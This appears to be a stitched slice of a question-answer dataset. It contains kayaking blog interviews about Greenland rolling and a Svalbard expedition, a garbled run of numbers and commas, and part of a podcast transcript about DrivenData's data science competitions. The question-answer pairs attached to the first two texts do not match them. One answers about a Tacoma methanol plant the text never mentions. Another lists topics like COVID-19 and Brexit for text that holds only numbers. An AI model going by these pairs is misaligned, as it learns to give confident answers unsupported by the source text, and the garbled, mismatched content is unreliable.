And you did this, and it just kind of fell to the ground, or went to the left or the right. Its very much the same. The timing and the technique has still gotta be there in order to get that accurate throw. So its very much the same as in a kayak.\nSome of the benefits again to loading the kayak up: when you are loading the kayak you can get your face closer to the surface, therefore you can reach further for leverage. It makes it easier to roll the kayak.\nThe load-drive concept is something that I never really learned from anybody else. I was always told about a hip snap\", or lift the leg, but nobody ever talked about that other leg. What is that other leg doing?\nWhen it comes to the some of the hardest rolls, forward finish brick rolls, for example, you gotta load and drive the kayak. If you dont, its gonna be almost impossible to do that roll. The load drive concept is the trick to the hardest rolls.\nSo I like to teach that to beginners. If you can teach a beginner the hardest technique, or the theory behind the hardest technique, and they can learn that from the beginning, then their success rate is huge. Theyll continue to roll. Its not just take a rolling session and never roll a kayak again. They actually continue to roll because theyve got so much power in their legs once they sort that out. So thats the load-drive concept.\nKatya: What is kayaking for you? Two sentences.\nJames: Kayaking for me is therapy. Thats one sentence. But its powerful!\nPosted at 11:03 AM in 2015, Pacific Paddling Symposium, The Art of Greenland Style | Permalink\nJAIME SHARP: Encounters with Polar Bears and the Svalbard Expedition\nJaime Sharp: Encounters with Polar Bears from Andrew Elizaga on Vimeo.\nExplorer/adventure photographer Jaime Sharp is in arctic Norway right now, attempting the first successful circumnavigation of the Svalbard archipelago by sea kayak with a team of two other kayakers, Tara Mulvany and Per Gustav Porsanger. Three previous attempts have been made, all ending in failure. Among the biggest hazards: polar bears. There are over 3000 polar bears living on the island, which makes it one of the areas with the highest concentration of polar bears in the world. Polar bears are one of the few animals that are purely predatory, Jaime said, speaking to the crowd gathered at the Pacific Paddling Symposium on Vancouver Island this past May. And they are one of the only animals that will actually hunt humans intentionally, not because they are curious but because its like, you are moving, so you are food. Polar bears will also hunt the seals that have burrows under the snow. They walk around listening for them and smelling them out. Then they smash through the snow and pull the seal out.\nJaime says that polar bear attacks were the reason for the failure of two previous attempts at the Svalbard circumnavigation. During the first expedition, a polar bear smashed one of the kayaks, so the team had to back out. In the last expedition, a polar bear actually attacked them in their sleep in the tent. Dragged them out of the tent, one of the guys by his head. They had to shoot the bear. As the bear came through the tent it stood on one of their rifles and snapped it in half. Luckily they had two, so they were able to get the other rifle and kill the bear.\nTo deal with polar bears, Jaime's team plans to have an active watch: In the high concentration bear areas, one of us will be staying awake at any point. So we will do three-and-a-half hour shifts, staying awake as well as having a perimeter fence. On top of guns, we will also be carrying daggers and flares and stuff like that, doing everything we can before have to shoot a bear.\nBoys Hunting Book 1890\nAnother hazard is ice. The second expedition was cancelled because pack ice came in and the team had to start dragging their kayaks across the ice. The ice \"started drifting away, taking them away from the island. And eventually they fell through the ice so many times they got injured, and they had to abort. So the ice and the polar bears are probably the biggest risk. Then on top of that you have the walrus. They can be territorial on the water and are known to come up to Zodiacs and puncture the Zodiacs with their tusks. Imagine them coming up to a kayak  theyll rip the the back half of your boat off! The ice is also an issue not just because it might drift and block us off, but it may not actually recede. It may not actually melt completely and we cant actually get around a quarter of the island route. So those are kind of our biggest challenges that were facing.\nYou can follow Jaimes expedition at his website, svalbard.worldwide adventure.com.\nAttaque de morses, 1870 Below is the complete transcript of our interview.\nAndrew: Have you personally had encounters with polar bears? Jaime: Back when I was like 25 I guess, or 26 not too long ago, Im only 34  I worked up in Churchill, Manitoba and I was a dogsled guide up there. Wed actually run clients out on the tundra. Anyone who knows of Churchill, Manitoba, knows its the polar bear capital of Canada. So wed see polar bears pretty much every day. Numbers of them. Wed encounter them on the dog sleds. Our dogs would want to chase them. The bears are scared of dogs, especially when youve got 8 of them trying to chase them. So my biggest issue was trying to stop the sled and keep them in position while I got the shotgun off my back and fired off a blank above them just to make sure the polar bear is running.\nThen we would have them coming at night. We had a little cabin we lived in. We had 46 dogs that lived around the cabin and an electric fence. And we had all the frozen chicken meal and stuff that wed use to feed the dogs under the house, but the polar bears could smell it. So they would be coming in at night time to look for this food. Theyd hit the electric fence. that would keep them back, but then the dogs would of course be barking. So wed wake up. Heres this huge polar bear on the other side of the fence. Wed have to put a spot light on it to see it. Its not been deterred by all these dogs, so then wed have to shoot blanks. And that wouldnt necessarily work. So then we would have an M80 shell that you could shoot. We would shoot a little wad of explosive out, and it would go BOOM. And then sometimes that wouldnt work. We had to bounce one off of one one time, a big male who was probably 13 ft tall, if he stood on his back legs. That was kind of a regular occurrence on most nights.\nAnd then we had another instance where we were right next to the arctic research center and that was where wed go have meals. And they had a storage room with the freezers in the back. So they pulled out all the meats and stuff to thaw one night for all the staff, and they had a bunch of tofu sausages and bacon and sausages and stuff out there. And these two young polar bears came in and they broke open the wall. And they took and ate all the food, and they left the tofu sausages!\nBut then the next day, they had to get out the traps. They had these big trap door barrels, these huge barrels that they could go inside, and then it shuts. They had to trap them, but only one was able to be trapped. That was a very interesting to sit and watch them actually go in and see the trap go down. This trailer that it was on, I think it took like six men to manhandle off the back the back of the truck to get it into position. It was just really solidly built. Suddenly the trap doors comes down. This young polar bear is in there, and this whole thing is lifting up and down on its wheels as its trying to bash its way out. So you can just see the power of the bear. And that was really interesting because at that point I was able to go up to the grille and be like THIS CLOSE to the polar bear. And hes in there and hes just putting his claws down the grille, and hes taking the paint flecks off the steel grille. You can just see how much power was in those claws, and you just knew that if it was raking human flesh, there would just be no chance. That was really my closest encounter with them.\nBut then Ive also had closer, more insecure moments with them, where theyve been maybe 200-300 meters from me, and all thats between me and them was the shotgun I had in my hand. So thats always been a little bit more intimidating. Just walking between our house and where we eat, and theres a polar bear sitting on the tundra. Just keeping an eye on them, just making sure that theyre there.\nBut this trip is going to be a totally different barrel of polar bears really, because the ones in Churchill are used to having people around.They are used to being hunted by man. They are used to dogs hunting them with man. So theyve got more of an intimidation factor against them from man and dogs. So it was easy to use that aspect to sort of stay safe. But where were going in Svalbard they have not been historically hunted by man, so man is definitely something thats on the food chain for them. They are a lot more curious. They are lot more willing to encounter man. But that being said, theres 3000+ polar bears on the island, but in the last 10 years there have been maybe three polar bear attacks. So the odds are pretty low still. Theres probably still more chance of being run over by a car than anything.\nKatya: So the reason youre going is because you just love polar bears? Honestly. I mean, what are the reasons?\nJaime: Well, I love kayaking. I love the challenge of kayaking. For me its an epic opportunity to actually do a kayaking trip thats a world first. Its also a trip that pushes everything Ive known about kayaking and what Ive been able to do. I started kayaking when I was 12 years old and Ive just pushed it, and Ive been an outdoor educator and guide and instructor. This for me is a chance to see what Im made of, and also to be able see polar bears. You dont want to see them too close. Its always amazing to be out there. You see walrus and polar bear and bowhead whales and stuff like that. Thats always pretty magic. To go to a place that no other person has very rarely ever been, especially by kayak, is a very unique kind of experience. Thats something that Ive always longed to experience.\nPosted at 08:34 PM in 2015, Pacific Paddling Symposium | Permalink\nFreya Fennwood prepares to compete in the 2015 Greenland National Kayaking Championships\nFreya is going to Greenland from Andrew Elizaga and Katya Palladina on Vimeo.\nWe caught up with outdoor action photographer Freya Fennwood at the South Sound Traditional Inuit Kayak Symposium (SSTIKS) this past weekend while she was training for her upcoming trip to participate in the Greenland National Kayaking Championships. She brought along a sporty new kayak, custom-designed by her father, John Lockwood, owner and designer of Pygmy Boats, the Port Townsend manufacturer of wooden stitch-and-glue kayak kits.\nAfter the rolling demo we sat sat down to talk with her about her preparations for Greenland. Here is the full transcript of our interview:\nAndrew: What inspired you to take the trip to Greenland?\nFreya: My father designed a boat specifically for me and specifically to do Greenland rolling. We came to SSTIKS actually, and Dubside was like, You guys should go to Greenland with this boat! Freya is really good! I think she could compete and do well!\nIts really not about doing well. Its just a really good excuse to go take this boat there and go participate in the paddling culture, which is something that Ive been born into and been in my whole life. To go to the birthplace of kayaking sounds like a really awesome experience, so Im really excited to see what its like there, to meet the people, and participate in what they do.\nAndrew: Can you tell us about what you mean about being born into the kayaking culture?\nFreya: Ive been paddling boats  in boats since I was 18 months old. My dad designed the first kayak for me when I was 5. It was built by the time I was 6, and I paddled that. Then he designed me another boat, maybe when I was around 10, the Osprey 13. And that was my next boat, and then he didnt really design me another boat until he designed the Freya. He decided to call this boat the Freya after me, which is pretty sweet! Cant complain. Gotta boat named after me!\nAndrew: How did your father get interested in Greenland style?\nFreya: Really its not something hes been into for super long. He probably picked up a Greenland paddle about 5 years ago. I remember as a little kid at kayak symposiums, seeing people with Greenland sticks and just thinking it was the silliest thing Id ever seen. And then my dad comes up to me  he is just raving about this paddle and how it doesnt hurt his shoulders, and how he can paddle twice as far as he could with the Euroblade. And I was like, OK, Ill try it out. And I tried the Greenland paddle and I was like, Oh, Im pretty young but this does actually NOT hurt my shoulders as much. I can paddle just as fast or faster, and longer with the Greenland paddle. So that kind of interest in Greenland paddling started from using the paddle first and then getting more interested in the boats.\nThe Pygmy boats my dad designs are definitely based off of traditional Greenland kayaks  hed have to tell you some big book of classic Inuit designs. His designs definitely take from that, but were only starting to come out with lower volume boats that are really made to do Greenland rolls really well in the past couple years.\nAndrew: Tell us about your kayak. Was it designed specifically for rolling?\nFreya: The Freya is really optimized to be a rolling and a kind of rock gardening play boat. We optimized it specifically for rolling, to do forward finishing rolls really well, and to do layback rolls really well. So the boat has more rocker than any other boat my dad has ever designed. It has more volume in it than a traditional, typical rolling skin-on-frame kayak, which actually helps it pop and roll up more. But it has a really low rear deck. My dad has designed this recess that is actually something that he came up with, that Pygmy has got a patent on, that really allows the back deck to be super low and then pop up to have nice volume, to have the boat flip back up. So really people are surprised when they see the boat. They think it looks really too-high volume, like, Oh, thats probably not going to be that easy to roll. And Im like, No, Im decent at rolling but my boat is really good at rolling.\nAndrew: So you are taking the Freya to Greenland? What does it take to get a kayak over there?\nFreya: We took the boat, and the shop cut it into 3 pieces. So its actually a three-piece take-apart kayak. We got the specs from the airlines  exactly how long the segments are allowed on the flights  and we cut the boat to those specifications. Its bolted together at the hatches essentially.\nAndrew: What kind of training have you been doing to prepare for the kayaking competition?\nFreya: Weve been thinking about potentially going for couple years and so Ive been slowly learning. I learned how to roll about 4-5 years ago. I didnt actually know how to roll, like as a little kid. Most of our kayaking is flat water stuff that is really close to shore. You would neednt to use a roll.\nSo I learned how to roll, and then I ended up being kinda decent at it. And it was fun just to learn all these other ones. And then the possibility of going to Greenland really motivated me to learn a lot more rolls. I probably wouldnt have learned this many rolls if there wasnt a purpose to it. A roll generally for me is for a purpose. I learn to roll so I can go into rougher, wilder conditions. To roll in 30-some ways, the purpose for me is to go experience Greenland.\nAndrew: Have you been consulting and asking for advice from some of the other people who have participated?\nFreya: Ive talked to Dubside, and hes taught me rolls here at SSTIKS, and has really informed us about Greenland. I was just up in Victoria with James Manke. He went and competed last year in Greenland, and he gave me a ton of information. I learned that I was supposed to preregister, and the registration was due last week! Hopefully it worked out. He contacted a person who is the head of registration, and was like, We have this girl, Freya. Shes coming to Greenland! She really wants to participate! She had no idea there was registration that needed to be done! So hes been a huge help with his knowledge. But theres a lot of information thats hard to find.\nIve talked to Helen Wilson, and shes been super helpful. But theres just a lot you dont really know until you get there. They all say you just have to go with the flow, and go with the intention of just participating and having fun. The schedule may be two days late, so Im just going and hoping to hang out in a beautiful place and meet other people who like to kayak.\nAndrew: Do you know if there are any other international competitors going?\nFreya: I have no idea if there are other international competitors. I dont believe if there are any Canadians. I dont know if there are any Americans. I dont think so, so I'll find out!\nPosted at 09:38 AM in 2015, The Art of Greenland Style | Permalink\nCheck out my VIMEO channel!\nBaja Expedition Skills Course 2006\nBuilding a Joel White Pooduck Skiff\nCedar Strip Kayak Construction: the Baidarka\nCedar Strip Kayak Construction: the Shooting Star Baidarka\nDancing with Hope\nDubside Watch\nFamily Europe 2006\nGreenland Style Skin On Frame Kayak Building\nHow to Build a Wood Stand Up Paddleboard (SUP) Free Step-By-Step Instructions\nKayaking along the Peruvian Coast\nKayaking Johnstone Strait and the Broughton Archipelago\nNorthwest Paddling Festival\nPacific Paddling Symposium\nPhilippines Baguio Mission 2014\nPhoxx Ekcs: Expedition Along Vancouver Island's North Coast\nPuget Sound Kayak Routes\nPuget Sound Sea Kayak Symposium\nSailing St Martin and St Barts\nThe Art of Greenland Style\nThe Philippines Baguio Mission 2013\nWest Coast Sea Kayaking Symposium\nWooden Boatbuilding", "question": " What is the proposed LNG facility in Tacoma, Washington, and what are some of the criticisms and concerns surrounding it?", "answer": "\nThe proposed LNG facility in Tacoma, Washington is a $3.4 billion methanol plant that would be the biggest thing to happen to Tacoma in years. Criticisms and concerns surrounding the facility include the following:\n\n1. It threatens to turn Tacoma back into a polluted, stinky industrial town, undoing the progress made in cleaning up the city's waterways and image.\n\n2. It would use natural gas obtained by fracking, which has environmental and health concerns related to water pollution, air pollution, and earthquakes.\n\n3. It poses a risk of explosion and pollution from transporting explosive chemicals through narrow urban waterways.\n\n4. It could liquify in a major earthquake due to being built on reclaimed land.\n\n5. It would consume an enormous amount of water, electricity, and gas, potentially increasing utility rates for everyone in Tacoma.\n\n6. It would create a \"sacrifice zone\" for the continued use of fossil fuels, which is not aligned with the city's sustainability goals.\n\n7. There has been a complete lack of transparency and engagement from the Port of Tacoma and city government in the decision-making process.\n\n8. It would likely have negative economic impacts on nearby neighborhoods and businesses.\n\nIn summary, the proposed LNG facility in Tacoma is facing significant criticism and controversy due to environmental, economic, and social concerns."}
{"text": ",\n1 -, 91,,34 ,2014,6%,1980,7.2% ,,, 2014,35%19-22,200655% 201441%,200634%, ,2014,4.4%12,20132.7% 2 -, 96,684,83\"\" 4,,,,4,52, ,32, ,12,4 828,11,,,63 3 -,\"\" 93,\"\"5,200, 3,358000-, ,2003,,5,190,, \",...,\" 4 -,,, 97,, ,2004,10007,2013,27 ,dna ,, 5 -\"\", 95,,,,,, 40,,, ,,, ,,,, ,, ,,\"\" 6 -, 94,1,352974, ,, 97,6,,35632,, , wavy96,6,2627,,45, 96,,10,5,7, , 7 -,,,\"\" 98,96,\"\",\"\" ,\",\",19942001,,\"\" ,\"  ,,,,\" \",\" ,,27%,\",\" ,6,2.5 8 -, 97,\"51\":101.6520\"\",1.6 201970,40,,1951,1959 400(1.6),1.17 ,1986,,,1360,120 9 - 98,,777,,15913\"\" 10 -\"\"\"\", 98,,18,,, ,46,,18133747  98,,, ,\"\"\"\" 716,3 fbi,14,2013,101283 wsbtv97,5,2217,50 11 -, 99,(erin brockovich) ,,,, 85,1.14,, ,\"1.14\", ,,, \",,,\" 2001, 12 --17,17,, 99,210,35()99,,3 -,,,-17 ,\",\" ,3, -\",,\" 13 -, (912)910,10,200,- 4548171514,,, ,-,, ,,, 4200,5,38 ,alln rses2012,,100,300 14 - 99,9,38-12, ,,3,,, 911,721 75,7,, 15 -, 911, 11,47,2730, ,5 16 -, 911,,,\"8\",,\"\" 17 - 912,27,,15.8,303685, hsh,,12.47% ,,30,1084.16(540) 54.78,10.5, (),9.1,,8.88.6 ,4.67 18 -30, 99,30,1800 19 -, 913,,(fda)10,,,4800,3000 \",\"\"\" 20127,,,9 : 20 -,: 913,,13450,400,4000 914,,72 915,585 21 -,, 913,13,,60575551, ,,, 913,, 22 -, 913,, 831,a321h,a321s,etops(), ,,, 23 -, 915,14,,7,67700, 916,18,2 24 -,,is 915,201012,,6,30,13,, 913,46,24 915,5,2020, 25 -1,4%, 1976,151981,,,,30, 5,, ,1,4% 26 -,, 915,15,,5,,3 ,4,141717 27 -, 915,15,,,,,6, 28 -, 915, 910,,100, ,, \",\" ,,, ,16 29 -: -1:,, -2:, -3\"50\":,50, 916,,20142013,,, ,10%1967,,50, ,5010%(2014) ,,20142013,,, 30 -4670, 9162014 ,2014,,20131.5%,20076.5%,19997.2% 2014,14.8%,2013,20072.32014,4670 ,2014,0.480,1993,5.9% 1999,1016.5%,7.2%,902.8%,15,, 2014,10.4%,330020132.9 31 -,25018:\"\" 916: ,,-, 2006,67%, ,25018-,,, ,-,, ,,125 ,2012-2013,26,4, -250,- 32 -\"\",, 917, ,,136,2006-2007  ,, , \"\",740 ,14.5,2012-201310.4% \"\"\",,\" 33 - kctv917,98,2217181 ,,, 917,3,20,,, 918,7,8, ,\",\" 917,831,21,, 917,628,517,16, 34 - -:35, 918,,,,,,,,35(223) ,1906,71 35 -...... -...... 918,,,26,5 2002,17,2010,27 ,500, ,,,,,, ,,2008, ,2007,, 36 - ktla919,,918,,, 918,215160suv,,,,suv,,, ,,,\"\",,\"\" ,,, 37 -\"3-4\", 920,19, ,16, ,98,7, ,3-4 38 -,5500%,, 921,,5500,5500% 8,325500,,13.5750 ,62,1,13.5\"\" ,, ,,,34-64 39 -,,(xian) 922,17,,-- 21,,\"-\",, ,, 40 - 922,1600,66500 ,1991,3500 45 -, 921,, 27,23% 27, 27,,30%28%26% ,\"\",\"\" 46 -,,, 922,,, 47 -, 922,,,600,  , ,50%,159,10.6 ,236,7.9,4000,7.4 ,2.9-3.5,2.6-2.9,3.5 48 -,\"\" 922,22,\"\",1 ,4505 \",,,\"  49 -:,, 923,,, \"\",,\"23,,\" \",\" ,\",\" :10 50 -100,7,, 924,,7 ,200720098851,, ,,, ,3823 ,100 51 -, 925,923,,4, ,,,10,,  , 5,72, 8,61 8,1816 1,", "question": " What are the main issues discussed in the article?", "answer": "\n        The main issues discussed in the article include:\n        - Police shootings and brutality, particularly the shooting of unarmed black men like Michael Brown and Eric Garner. \n        - Racial inequality and discrimination, especially against blacks. \n        - The refugee crisis, with a focus on Syrian refugees and European countries' reluctance to accept them.\n        - Terrorism and the threat posed by groups like ISIS. \n        - Climate change and the Paris Agreement. \n        - Political issues like the U.S. presidential election and the Brexit referendum.\n        - Economic issues like income inequality and the gig economy.\n        - Technology issues like the rise of social media and its impact on politics. \n        - Health issues like the COVID-19 pandemic and vaccination programs.\n        - Education issues like the impact of COVID-19 on schools and universities.\n        - Environmental issues like deforestation and pollution.\n        In summary, the article covers a wide range of topics related to politics, economics, social issues, and the environment. It reflects the diversity and complexity of the issues facing the world today."}
{"text": "Hosted by Jonan Scheffler, with guest Isaac Slavitt.\nThere's data being generated and collected all around us, from the shows we binge watch to the shoes we buy online. Isaac Slavitt has a different concern: can data scientists use their methodologies to prevent diseases, combat pollution, or track wildlife migration patterns?\nIsaac Slavitt is the co-founder of DrivenData, a platform for organizations to solicit help from data scientists to solve real-world problems. DrivenData does this by running \"competitions\" which asks teams to comb through data sets to solve problems for cash rewards.\nOne such competition was Zamba. Researchers set up cameras in African forests and asked engineering experts to develop AI software which could classify the types of animals which were captured. This would then help with research and conversation efforts without disturbing the natural ecosystem. Another such competition is DengAI, which seeks ML techniques to try and predict future outbreaks of dengue fever.\nIsaac concludes the interview by talking about DrivenData's tech stack. He discusses the uses of both R and Python in the data scientist community. He notes that many computationally intensive task, such as ML classification and testing, are able to be offloaded to a service like Paperspace, while the majority of their platform runs on Heroku.\nJonan Scheffler: Hello, and welcome back to Code[ish]. My name is Jonan Scheffler. I'm a developer advocate here at Heroku, and I am joined here today by my friend Isaac from Driven Data. Isaac, introduce yourself, please.\nIsaac Slavitt: Hi, I'm Isaac Slavitt. I'm a co-founder and data scientist at Driven Data, and I work with mission-driven organizations to help figure out the best ways to use their data for the kind of social impact problems that they're working on.\nJonan Scheffler: That is a very polished elevator pitch. I feel like it was very casual, too. This is a thing you have clearly said many times.\nIsaac Slavitt: I like to change it up a little bit just so it sounds fresh.\nJonan Scheffler: Yeah, that's very relaxed. I want to detail a little bit for our listeners what I know of Driven Data, and then you can tell me where I'm wrong and maybe give us a little more detail, if that's okay.\nJonan Scheffler: As I understand, Driven Data came out of the Harvard Innovation Lab in 2014.\nIsaac Slavitt: Yeah, that's right. The original idea came from a grad school project. My partner, Peter, and I were looking at how we might find an interesting data set that had some sort of social angle and work on that. We really had a lot of trouble finding it, so what's the next best thing to working on a social-impact data set is coming up with a platform to collect social-impact data sets.\nJonan Scheffler: That was a brilliant step, actually. This was a graduate school project for you. What were you studying?\nIsaac Slavitt: We were in a computational science and engineering program, which is sort of like a computer science and applied math flavor of what we now call data science.\nJonan Scheffler: This was 2014. When do you think the field of data science really started to explode? It's still exploding. I think, though, in the beginning, these were pretty select skills. If you were going to become a data scientist, you were probably working at one of the big companies if you wanted to do a lot of machine learning work or kind of bleeding-edge machine learning, artificial intelligence kind of work, but I guess there are still plenty roles in just business intelligence teams across the country, different corporations.\nIsaac Slavitt: Yeah, you're totally right. I think the names have always been kind of an interesting progression. Even in 2014, people were talking about data science, but it was still relatively new. It was only five years ago, but very few people had that title, and most of them were working at successful startups in the San Francisco Bay area. Even now, just a few years later, it's really exploded in popularity.\nJonan Scheffler:... doing all of this work yourselves and a tremendous amount of work. I was shocked when I heard that number, actually. I think you have, right now on your site, three active competitions. You're running these competitions all the time on these data sets, so tell me how that works. How do you come up with these ideas for these competitions? What do they do for you?\nJonan Scheffler: Occasionally, you run them just to put the knowledge out there, and so I come and I contribute my model that I've built. Forgive me. I am not a data scientist, so I'm very likely to misuse words in this discussion, but I come. I find your competition. I download the data set, and I train up a model that I think accurately predicts something. As an example, one of the competitions up right now is to predict dengue fever infections, I guess. As the climate changes through mosquito-infested regions, you're able to predict sometimes based on climate and weather patterns where the next dengue fever outbreak is going to be.\nJonan Scheffler: I train up my model on this problem, and I submit it to you under an open source license, which I applaud you for, by the way. It's MIT, is that correct?\nJonan Scheffler: Okay. Then, even if, for example, this dengue fever one doesn't offer a prize, we're still building the knowledge of the science around this dengue fever outbreak, and we're contributing back to the world generally, right?\nIsaac Slavitt: Yeah, definitely. We sort of look at these as really fun warmups for folks who are interested in competing in the competitions or learning about data science. I think for a lot of people who are getting into the field, one of the biggest early roadblocks is not necessarily learning particular skills, because with online courses and just YouTube videos and blogs and other resources, there's so much information out there.\nIsaac Slavitt: What they're really struggling to find is an applied project where they can get feedback, so it's kind of like if I think back to my college calculus course, I think the even exercises had solutions in the back, but the odd ones didn't. If you're trying to learn by yourself, and you don't know how well you're doing, that's a real roadblock to kind of moving your skills forward. These competitions are always out there for folks to work on, and we also have a pipeline of four prize competitions that get developed and released on a sort of a relatively regular schedule.\nJonan Scheffler: I like very much that sense of community that evolves around these competitions. You're able to get immediate feedback because you can quantitatively compare your results against what other people in the competition have submitted, so you know immediately who you're racing against. There's this feeling of being on a team on behalf of science. You're all working towards this common, very altruistic goal. I imagine that's a very fulfilling way to work. I have never had the opportunity as a developer to work for a company that did this kind of thing.\nJonan Scheffler: I find value in what I do. Don't get me wrong, and I think people are good at justifying the value of what they do, but this is very clearly changing the world. I applaud you. That's got to be a very good feeling.\nIsaac Slavitt: It feels great. Actually, one of the most gratifying things about doing this has been to see that even for competitions where there's a really robust prize... There's a lot on the table that people are competing for. A pattern that we often see is that somebody who's winning... they're in the top three, and they're have a good shot of taking home a big piece of that prize... will go on the forum and share with the other people who are working on it some pointers and tips and tricks from their exploratory analysis and modeling just because it feels like one of those pay-it-forward things where they they learn from other people, and they've learned a lot from these competitions. It doesn't feel like a zero-sum game, even though there's prize money on the table.\nJonan Scheffler: I really appreciate that mentality, this sense of team that appears, and you mentioned even when there is a lot on the line. I'm very curious to know what is the largest prize you've offered for one of these.\nIsaac Slavitt: Sure. I think there was a competition that wasn't exactly the same as our drivendata.org competitions in that it wasn't people submitting predictions to a straight predictive-modeling competition, but we ran a kind of online challenge called Concept to Clinic. This was, I would say, a year or two ago, where people were kind of taking models that had been developed in a previous data science competition and actually writing software. We opened a GitHub repo kind of around the model, and we stubbed out an application that would let... In this case, it was clinical researchers who were working on detecting lung cancer from early screen scans who would take the model and then kind of move that forward by writing the software around the model so that it could be used, so that it could be fed new scans. For that competition, there was a $100,000 prize pool.\nIsaac Slavitt: A ton of people were working this. Again, you'd expect maybe people would be hoarding information and trying to work on their little corner of the project. What we actually saw was it looked like a regular open-source project. People were opening issues and discussing things and reviewing each others' pull requests. It was really nice to see.\nJonan Scheffler: That's fascinating. The whole time, you're moving forward cancer research. You're providing early detection software to cancer researchers. These clinicians, they don't necessarily have the coding ability to put together these models or get them online, but you are making it accessible to them. Not only are you setting up the model, but you're providing a web application template that someone could deploy on a place like, for example, Heroku. I don't know if you've heard of Heroku. They're pretty great. You could put this application online there, and then the clinicians have ready access to the research.\nIsaac Slavitt: That's right. What we were trying to do here was develop a proof of concept, and we were working with the Addario Lung Cancer Foundation, which is a major lung cancer research and funder in the United States. We have a ton of respect for them. They're very forward thinking in what sorts of research they fund in addition to very traditional clinical research.\nIsaac Slavitt: Competitions are awesome. They get a ton of engagement, and they really get to sort of the state of the art. It's hard to beat when you have all sorts of individuals with academic backgrounds and practitioner backgrounds who are working on a hard problem and trying all sorts of different things. You really explore the solution space, so you can be pretty confident that what you end up with at the end is probably as close as you can get to separating signal from the noise.\nIsaac Slavitt: What happens, though, is a model is just a bunch of files in a folder with the source code that made them, and so it's a huge, huge challenge to get good models, but it's also a sort of interesting problem to work on where you take models and you try to make it happen. You have to write the software so that people can use them.\nJonan Scheffler: The example that I initially found when I was looking at Driven Data was a project called... It's called Project Zamba, I think. I wonder if you could tell me more about that.\nIsaac Slavitt: Sure. Project Zamba started with a competition, and the idea behind the competition is that a lot of researchers who are looking into environmental conservation and animal behavior rely on footage gathered by camera traps. These are little motion detector-activated cameras that researchers can put up in trees or other kind of manmade structures.\nJonan Scheffler: Some kind of hideout in the forest, and I park this along a trail and wait for something to move. It turns on and gives me a short clip of video that I review later, right?\nJonan Scheffler: You're literally just watching hours and hours of footage and tagging, all right, at a minute 35, there was a pangolin, right? Manually.\nIsaac Slavitt: That's exactly right.\nJonan Scheffler: That could take a long time to accrue data, I imagine, but you had a pretty significant set when you launched this competition.\nIsaac Slavitt: Yeah, we had a big set of data. The thing about these camera traps is that if you keep them out there, you get a ton of information. It actually becomes a kind of a race. How quickly can you label all of these videos? More keeps coming in, so this is one of those things where, for years, people have wanted to automate this in some way, but either the algorithms or the hardware weren't up to the task. We're finally at a place where it makes sense to see whether a lot of this classification work can be pushed to the computer first and then just verified by a human.\nJonan Scheffler: I think you told me there were 300,000 clips in the initial data set. Is that right?\nIsaac Slavitt: That's right. Yeah, 300,000.\nJonan Scheffler: The 300,000 clips were already classified manually by people, but even if for a new clip, you were only able to tell me if it was an animal or a human... which I know that I am oversimplifying things, but in my brain that is not a data scientist brain, that seems like a relatively easy classification problem as compared to identifying the difference between a raccoon and a pangolin, for example, which is in fact exactly what you have done.\nJonan Scheffler: Your winning models are able to classify a set of species specifically out of any given clip. I can upload a video now and find out if there's a pangolin in it. Am I correct?\nIsaac Slavitt: That's exactly right, but there's actually one win that's even easier that's a little bit further upstream. The first task is figuring out whether the videos have an animal at all or whether it's just kind of background motion. That's something that is actually pretty doable with computer vision. It's not necessarily the kind of thing where you need a deep neural network.\nIsaac Slavitt: Certainly, deep neural networks are good at that, but that's the kind of thing where people have been doing that for a little while, but in order, like you said, to classify between a raccoon and a pangolin, which are both... they can be about the same size and have, if you're squinting or it's dark, roughly the same kind of outline, that's really hard to do with traditional deterministic methods. That's where we're just at a point where the best-performing neural networks do very well at that and close to what a human would just do by looking and classifying them manually.\nJonan Scheffler: When you were talking about doing this without machine learning, if I were to take kind of still images of these animals... I have a silly example, maybe, from my career on the speaking circuit. I go around to these Ruby conferences, and I talk about my silly projects. One of them was a terrible, terrible, do-it-yourself home security system that used a Raspberry Pi. It would just snap a still image every second, and it would then turn that image into a set of zeroes and ones by some method.\nJonan Scheffler: It actually would minify that, and I would end up with this 64-bit hash of what image was. I could then use... That's called perceptual hashing that I was using to reduce this down to this 64-bit number, and then I would use the Hamming distance of those numbers to tell the difference between to images. Obviously, being able to accomplish that without the machine learning piece doesn't take away the value of having not only these models up there but the tools to use them. Even if we know how to accomplish those things easily, as you said, without the machine learning piece, it's still not accessible to the researchers, so the information is invaluable.\nIsaac Slavitt: Yeah. You could get pretty far using more traditional computer vision methods. People have been working on these and perfecting them for a very long time, but there's a jump after that where your computer vision will kind of plateau, and you need a more kind of probabilistic model that can learn from data. It's hard once you start bumping up against the fundamental limitations of the data you have, like if you think about two pictures that are kind of in the dark that have similar-looking animals. It's not clear how you could just use a filter or a hash to try to figure out which is which. That's where you just need to have it look at a ton of different examples and build its own features so that it can classify better in the future.\nJonan Scheffler: This is why I think the future looks bright, maybe, for data scientists from Harvard, for example.\nIsaac Slavitt: I like to think so.\nJonan Scheffler: I think you may be employed for some time to come, Isaac.\nIsaac Slavitt: We've been reading articles like data scientist is the sexiest job of the 21st century and things like that for a while. I love that this skillset is getting more attention. I think that it's actually more that the general public's attention to quantitative methods has started to catch up. My undergraduate major was operations research, which is not something that a whole lot of people have heard of, but really it's just sort of applied math applied to kind of real-world business problems.\nJonan Scheffler: Like operations problems inside of a corporate, or I've got a factory, and you're doing optimization somehow.\nIsaac Slavitt: Yeah. The history of it goes back to World War II, where people were trying to figure out, given certain constraints on fuel and distance, where do I put my planes and all sorts of tasks like that, and then if you think about any kind of company that deals with constraints and optimization. Just think about UPS or FedEx. They're just a fractal of these problems. The closer and closer you look at what they need to do and figure out and optimize, everything becomes an optimization problem, so that's going back to the 1940s, that sort of tool set.\nIsaac Slavitt: Statistics is a much older field, and people have been using applied statistics for a very long time, so all of that was a kind of roundabout way of saying data science is a newish term, but it's really an umbrella term holding a lot of different fields. I do think it's special when you take kind of traditional quantitative analysis tools and you also combine that software and computer science skills. That's where a lot of the power comes in, when you're working with workplaces where everyone uses a computer, but some of this is just the terminology catching up to what has been important for a very long time.\nJonan Scheffler: Now, we also have the technology to catch up as well, right? We have these cloud computing platforms that are capable of handling incredibly large workloads. I have a friend who works at Google, another developer advocate over there, who just recently calculated a new world record for digits of pi using these cloud platforms that are now available, which is not something that could have been accomplished before. The pace of innovation around these platforms, and now you have GPUs available for you all the time to run your machine learning and train up your models. It's a brilliant and bright future, I think, for data science and for software. I'm looking forward to seeing where things go.\nIsaac Slavitt: Yeah, and I think it would be difficult to overstate how important it is that open source has exposed so many people to these tools. It used to be the case where if you wanted to work on a GIS system, or you wanted to work on a good relational database, or you wanted to work on time series forecasting, you had to really get a job at one of the companies that either built 